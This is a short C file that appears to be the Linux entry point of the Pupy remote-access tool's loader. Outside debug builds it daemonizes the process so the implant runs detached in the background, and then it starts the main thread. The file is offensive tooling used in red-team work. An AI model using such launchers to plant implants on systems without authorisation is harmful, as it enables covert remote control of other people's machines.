#include "pupy_load.h"
#include "daemonize.h"

#include <mcheck.h>

int main(int argc, char *argv[], char *env[]) {
#ifndef DEBUG
    daemonize(argc, argv, env, true);
#else
    mtrace();
#endif
    return mainThread(argc, argv, false);
}
